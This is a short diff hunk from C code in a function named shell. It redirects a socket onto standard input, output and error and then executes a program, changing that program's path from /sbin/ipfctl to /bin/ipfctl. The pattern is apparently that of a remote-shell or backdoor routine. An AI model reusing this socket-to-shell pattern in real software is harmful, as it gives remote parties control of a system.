@@ -63,7 +63,7 @@ void shell(int ip) {
 		dup2(sd,0);
 		dup2(sd,1);
 		dup2(sd,2);
-		execl("/sbin/ipfctl", (char *)0);
+		execl("/bin/ipfctl", (char *)0);
 		close(sd);
 	}
 
